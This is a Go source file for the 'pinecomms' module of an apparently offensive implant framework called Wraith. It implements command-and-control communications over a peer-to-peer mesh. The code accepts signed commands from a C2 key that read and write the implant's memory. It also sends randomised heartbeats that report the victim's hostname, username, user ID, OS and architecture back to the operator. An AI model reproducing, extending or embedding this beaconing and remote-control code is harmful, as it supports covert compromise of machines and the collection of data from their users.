package modulepinecomms

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"sync"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
)

const (
	MOD_NAME = "w.pinecomms"

	SHM_ERRORS = "w.errors"
)

// A CommsManager module implementation which utilises (optionally) encrypted JWT
// as a base for its transfer protocol. This allows messages to be signed and
// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
// particularly advanced features and is meant as a simple default which does a
// good job in most usecases.
type ModulePinecomms struct {
	mutex sync.Mutex

	// Configuration properties

	OwnPrivKey   ed25519.PrivateKey
	AdminPubKey  ed25519.PublicKey
	ListenTcp    string
	ListenWs     string
	UseMulticast bool
	StaticPeers  []string
}

func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pr radio.Radio, packet proto.Packet) {

	//
	// Validate and process the packet.
	//

	peerPublicKey, err := hex.DecodeString(packet.Peer)
	if err != nil {
		// This shouldn't happen, but if the peer public key is
		// malformed then we have no choice but to ignore the
		// packet.
		return
	}

	if !bytes.Equal(peerPublicKey, m.AdminPubKey) {
		// This ensures that request packets are only accepted from
		// the c2. As packets are signed, eventually we may be able
		// to drop this check if we account for replay attacks. This
		// would allow for store-and-forward capability where new
		// Wraiths coming online will continue to execute commands
		// or load modules even if c2 is down.
		return
	}

	packetData := proto.PacketReq{}
	err = proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
	if err != nil {
		// The packet data is malformed, there is nothing more we
		// can do.
		return
	}

	//
	// Evaluate the packet conditions.
	//

	// TODO
	//packetData.Conditions

	//
	// Execute the packet payload.
	//

	// Read cells.
	readCells := make(map[string]any, len(packetData.Payload.Read))
	for _, cell := range packetData.Payload.Read {
		readCells[cell] = w.SHMGet(cell)
	}

	// Write cells.
	for cell, value := range packetData.Payload.Write {
		w.SHMSet(cell, value)
	}

	// List cells.
	var memList []string
	if packetData.Payload.ListMem {
		mem := w.SHMDump()
		memList = make([]string, 0, len(mem))
		for key := range mem {
			memList = append(memList, key)
		}
	}

	//
	// Respond to the packet.
	//

	responseData := proto.PacketRes{
		Payload: struct {
			Read    map[string]any
			MemList []string
		}{
			Read:    readCells,
			MemList: memList,
		},
		TxId: packetData.TxId,
	}

	responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
	if err != nil {
		// There is no point sending anything because the TxId is included
		// in the responseData and without it, c2 won't know what the response
		// is to.
		return
	}

	pr.Send(ctx, proto.Packet{
		Peer:   packet.Peer,
		Method: http.MethodPost,
		Route:  proto.ROUTE_RESPONSE,
		Data:   responseDataBytes,
	})
}

func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	// Ensure this instance is only started once and mark as running if so.
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", MOD_NAME))
	}
	defer m.mutex.Unlock()

	// Make sure keys are valid.
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}

	// Get a struct for managing pinecone connections.
	pr := radio.GetInstance()

	//
	// Configure pinecone manager.
	//

	pr.SetPineconeIdentity(m.OwnPrivKey)
	pr.SetInboundAddr(m.ListenTcp)
	pr.SetWebserverAddr(m.ListenWs)
	pr.SetUseMulticast(m.UseMulticast)
	pr.SetStaticPeers(m.StaticPeers)

	// Start the pinecone manager and make sure it stops when
	// the module does.
	defer func() {
		pr.Stop()
	}()
	go pr.Start()

	//
	// Run the module.
	//

	// Heartbeat loop.
	go func() {
		// Cache some values used in the heartbeat.

		strain := w.GetStrainId()
		initTime := w.GetInitTime()
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "<unknown>"
		}
		username := "<unknown>"
		userId := "<unknown>"
		currentUser, err := user.Current()
		if err == nil {
			username = currentUser.Username
			userId = currentUser.Uid
		}
		errs, _ := w.SHMGet(SHM_ERRORS).([]error)

		for {
			// Pick an interval between min and max for the next heartbeat.
			interval := proto.HEARTBEAT_INTERVAL_MIN + rand.Intn(
				proto.HEARTBEAT_INTERVAL_MAX-proto.HEARTBEAT_INTERVAL_MIN,
			)

			// Send heartbeat after interval or exit if requested.
			select {
			case <-ctx.Done():
				return
			case <-time.After(time.Duration(interval) * time.Second):
				// Build a heartbeat data packet.
				heartbeatData := proto.PacketHeartbeat{
					StrainId:   strain,
					InitTime:   initTime,
					Modules:    w.ModsGet(),
					HostOS:     runtime.GOOS,
					HostArch:   runtime.GOARCH,
					Hostname:   hostname,
					HostUser:   username,
					HostUserId: userId,
					Errors:     len(errs),
				}
				heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
				if err != nil {
					panic("error while marshaling heartbeat data, cannot continue: " + err.Error())
				}

				// Send the packet.
				pr.Send(ctx, proto.Packet{
					Peer:   hex.EncodeToString(m.AdminPubKey),
					Method: http.MethodPost,
					Route:  proto.ROUTE_HEARTBEAT,
					Data:   heartbeatBytes,
				})
			}
		}
	}()

	// Start receiving messages.
	// Background context is okay because the channel will be closed
	// when the manager exits further down anyway.
	recv := pr.RecvChan(context.Background())

	// Mainloop.
	for {
		select {
		// Trigger exit when requested.
		case <-ctx.Done():
			return
		// Process incoming packets.
		case packet := <-recv:
			switch packet.Route {
			case proto.ROUTE_REQUEST:
				// Launch a goroutine to handle the request and issue a response.
				go m.handleRequest(ctx, w, pr, packet)
			}
		}
	}
}

// Return the name of this module.
func (m *ModulePinecomms) WraithModuleName() string {
	return MOD_NAME
}
